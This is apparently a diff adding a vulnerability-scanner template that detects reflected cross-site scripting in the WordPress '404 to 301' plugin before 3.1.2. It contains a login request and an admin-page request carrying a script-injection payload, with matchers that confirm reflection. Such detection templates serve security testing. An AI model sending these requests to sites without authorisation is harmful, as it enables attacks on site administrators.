@@ -1,0 +1,50 @@
+id: 404-to-301-xss
+
+info:
+  name: WordPress 404 to 301 Log Manager <3.1.2 - Cross-Site Scripting
+  author: Akincibor
+  severity: medium
+  description: WordPress 404 to 301 Log Manager 3.1.2 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
+  reference:
+    - https://wpscan.com/vulnerability/4a310b4f-79fa-4b74-93f8-e4522921abe1
+    - https://wordpress.org/plugins/404-to-301
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  metadata:
+    max-request: 2
+  tags: wpscan,wp-plugin,xss,wp,wordpress,authenticated
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        GET /wp-admin/admin.php?page=jj4t3-logs&a"><script>alert(1)</script> HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"><script>alert(1)</script>'
+          - '404 Error Logs'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a0048304602210084548d0df0e97a191fbaf3bda6161bee9381816bcb882b36741087ddcdebb3650221008134a56a2fe3327af0378e670a41f0eec94651f9e4ddc77b6e184ec843bf7190:922c64590222798bb761d5b6d8e72950
